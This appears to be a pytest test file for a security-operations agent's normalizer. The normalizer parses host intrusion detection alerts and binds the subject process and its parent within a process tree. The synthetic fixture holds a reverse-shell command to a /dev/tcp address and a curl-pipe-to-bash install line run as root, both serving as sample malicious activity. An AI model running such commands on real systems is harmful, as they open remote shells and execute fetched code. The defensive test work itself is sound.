from __future__ import annotations

from copy import deepcopy

import pytest

from soc_agent.normalizers import normalize_alert_payload
from soc_agent.normalizers.pingan_hids import build_hids_process_observations, hids_primary_process
from soc_agent.normalizers.pingan_messages import parse_pingan_raw_message

COMMAND = "bash -c exec 3<>/dev/tcp/10.10.20.30/31443"
SOURCE = "alert.hitLog[0].zeusRawLogs[0].message"


def _fields() -> dict[str, str]:
    nodes = [
        ("systemd", 1, "/usr/lib/systemd/systemd", "/usr/lib/systemd/systemd --system"),
        ("crond", 2, "/usr/sbin/crond", "/usr/sbin/crond -n"),
        ("sh", 3, "/usr/bin/bash", "sh -c curl -sS http://10.10.1.2/install.sh | bash"),
        ("bash", 4, "/usr/bin/bash", "bash"),
        ("bash", 5, "/usr/bin/bash", "bash install.sh install"),
        ("timeout", 6, "/usr/bin/timeout", "timeout 2 " + COMMAND),
        ("bash", 7, "/usr/bin/bash", COMMAND),
    ]
    fields = {
        "event_type": "web_command",
        "host_name": "synthetic-hids",
        "detail.process_name": "bash",
        "detail.process_tree": "->".join(f"{name}({pid})" for name, pid, _, _ in nodes),
        "event_content": "bash进程发现异常执行行为，其执行命令为：" + COMMAND,
    }
    for index, (name, pid, path, command) in enumerate(nodes):
        prefix = f"detail.proctree.{index}."
        fields.update(
            {
                prefix + "proc_name": name,
                prefix + "proc_pid": str(pid),
                prefix + "proc_path": path,
                prefix + "proc_cmd": command,
                prefix + "proc_euidUsername": "root",
            }
        )
    return fields


def _message(fields: dict[str, str]) -> str:
    return " ".join(f'{key}="{value}"' for key, value in fields.items())


def _parsed(fields: dict[str, str]):
    parsed = parse_pingan_raw_message(_message(fields), source_path=SOURCE)
    assert parsed is not None
    return parsed


def test_indexed_nodes_supply_complete_facts_without_semantic_review() -> None:
    parsed = _parsed(_fields())
    nodes = build_hids_process_observations([parsed])[0]["nodes"]

    assert len(nodes) == 7
    assert nodes[3] == {"process_name": "bash", "process_id": 4, "process_path": "/usr/bin/bash", "command_line": "bash", "username": "root"}
    assert nodes[-1] == {"process_name": "bash", "process_id": 7, "process_path": "/usr/bin/bash", "command_line": COMMAND, "username": "root"}
    assert hids_primary_process([parsed]) == {
        "process_name": "bash",
        "process_id": 7,
        "process_path": "/usr/bin/bash",
        "command_line": COMMAND,
        "parent_process_name": "timeout",
        "parent_process_id": 6,
        "parent_command_line": "timeout 2 " + COMMAND,
    }


def test_indexed_facts_have_exact_field_provenance() -> None:
    alert = normalize_alert_payload({"alert": {"alertId": "synthetic", "hitLog": [{"topic": "security_qthids", "zeusRawLogs": [{"message": _message(_fields())}]}]}})
    provenance = {item["canonical_path"]: item for item in alert.extensions["canonical_field_provenance"]}

    for target, source in {
        "entities.process.process_id": "detail.proctree.6.proc_pid",
        "entities.process.process_path": "detail.proctree.6.proc_path",
        "entities.process.command_line": "detail.proctree.6.proc_cmd",
        "entities.process.parent_process_id": "detail.proctree.5.proc_pid",
        "entities.process.parent_command_line": "detail.proctree.5.proc_cmd",
        "entities.process.observations[0].nodes[3].command_line": "detail.proctree.3.proc_cmd",
        "entities.process.observations[0].nodes[6].username": "detail.proctree.6.proc_euidUsername",
    }.items():
        selected_from = provenance[target]["selected_from"]
        if selected_from.startswith("entities.process.observations["):
            selected_from = provenance[selected_from]["selected_from"]
        assert selected_from == f"{SOURCE}#parsed.{source}"


@pytest.mark.parametrize("cause", ["duplicate_command", "pid_command_conflict", "tree_identity_conflict"])
def test_conflicting_or_ambiguous_subject_does_not_guess_a_pid(cause: str) -> None:
    fields = _fields()
    if cause == "duplicate_command":
        fields["detail.proctree.3.proc_cmd"] = COMMAND
    elif cause == "pid_command_conflict":
        fields["detail.pid"] = "4"
    else:
        fields["detail.proctree.6.proc_pid"] = "99"
    parsed = _parsed(fields)
    before = deepcopy(parsed.fields)
    primary = hids_primary_process([parsed])

    assert primary.get("process_id") is None
    assert primary.get("parent_process_id") is None
    assert parsed.fields == before


def test_explicit_pid_selects_the_matching_node_and_parent() -> None:
    fields = _fields()
    fields["detail.pid"] = "5"
    fields["event_content"] = "bash进程发现异常执行行为，其执行命令为：bash install.sh install"
    primary = hids_primary_process([_parsed(fields)])

    assert primary["process_id"] == 5
    assert primary["command_line"] == "bash install.sh install"
    assert primary["parent_process_id"] == 4
    assert primary["parent_command_line"] == "bash"


def test_indexed_nodes_work_without_the_redundant_short_tree() -> None:
    fields = _fields()
    del fields["detail.process_tree"]
    assert hids_primary_process([_parsed(fields)])["process_id"] == 7
    assert len(build_hids_process_observations([_parsed(fields)])[0]["nodes"]) == 7


def test_short_tree_repeated_name_does_not_overwrite_the_first_ancestor() -> None:
    parsed = _parsed({"detail.process_name": "bash", "detail.process_tree": "sh(1)->bash(2)->bash(3)", "event_content": "bash进程发现异常执行行为，其执行命令为：" + COMMAND})
    primary = hids_primary_process([parsed])
    nodes = build_hids_process_observations([parsed])[0]["nodes"]

    assert primary.get("process_id") is None
    assert primary.get("parent_process_id") is None
    assert all(node.get("command_line") is None for node in nodes)


def test_short_tree_unique_name_keeps_legacy_command_binding() -> None:
    parsed = _parsed({"detail.process_name": "bash", "detail.process_tree": "sh(1)->bash(2)", "event_content": "bash进程发现异常执行行为，其执行命令为：" + COMMAND})
    primary = hids_primary_process([parsed])
    assert primary["process_id"] == 2
    assert primary["parent_process_id"] == 1
    assert primary["command_line"] == COMMAND


def test_explicit_pid_does_not_require_a_redundant_process_name() -> None:
    fields = _fields()
    del fields["detail.process_name"]
    fields["detail.pid"] = "7"
    primary = hids_primary_process([_parsed(fields)])
    assert primary["process_id"] == 7
    assert primary["process_path"] == "/usr/bin/bash"
    assert primary["parent_process_id"] == 6


def test_parent_conflict_remains_visible_in_the_binding() -> None:
    from soc_agent.normalizers.pingan_hids import hids_process_subject_binding

    fields = _fields()
    fields.update({"detail.ppname": "sh", "detail.ppid": "3"})
    parsed = _parsed(fields)
    observation = build_hids_process_observations([parsed])[0]
    assert hids_process_subject_binding(parsed, observation)["status"] == "conflict"
    assert hids_primary_process([parsed]).get("parent_process_id") is None


def test_indexed_only_missing_ancestor_does_not_invent_an_adjacent_parent() -> None:
    fields = _fields()
    del fields["detail.process_tree"]
    fields = {key: value for key, value in fields.items() if not key.startswith("detail.proctree.5.")}
    primary = hids_primary_process([_parsed(fields)])
    assert primary["process_id"] == 7
    assert primary.get("parent_process_id") is None


def test_subject_and_field_sources_are_explicit_and_source_scoped() -> None:
    observation = build_hids_process_observations([_parsed(_fields())])[0]
    assert observation["subject_binding"]["status"] == "resolved"
    assert observation["subject_binding"]["node_index"] == 6
    assert observation["subject_binding"]["parent_node_index"] == 5
    assert observation["field_sources"]["nodes[6].process_id"] == f"{SOURCE}#parsed.detail.proctree.6.proc_pid"
    assert observation["field_sources"]["nodes[6].command_line"] == f"{SOURCE}#parsed.detail.proctree.6.proc_cmd"


def test_repeated_name_only_chain_keeps_ambiguity() -> None:
    parsed = _parsed({"detail.process_name": "bash", "detail.process_chain": "sh->bash->bash", "event_content": "bash进程发现异常执行行为，其执行命令为：" + COMMAND})
    observation = build_hids_process_observations([parsed])[0]
    assert [node["process_name"] for node in observation["nodes"]] == ["sh", "bash", "bash"]
    assert observation["subject_binding"]["status"] == "ambiguous"


def test_conflicting_duplicate_pid_keeps_both_observed_commands() -> None:
    fields = _fields()
    fields["detail.proctree.6.proc_pid"] = "4"
    parsed = _parsed(fields)
    observation = build_hids_process_observations([parsed])[0]
    assert observation["subject_binding"]["status"] == "conflict"
    assert {node.get("command_line") for node in observation["nodes"] if node.get("process_id") == 4} == {"bash", COMMAND}


def test_unique_command_without_pids_keeps_its_own_parent() -> None:
    fields = {key: value for key, value in _fields().items() if key != "detail.process_tree" and not key.endswith(".proc_pid")}
    observation = build_hids_process_observations([_parsed(fields)])[0]
    assert observation["subject_binding"]["node_index"] == 6
    assert observation["subject_binding"]["parent_node_index"] == 5
    assert hids_primary_process([_parsed(fields)])["parent_process_name"] == "timeout"
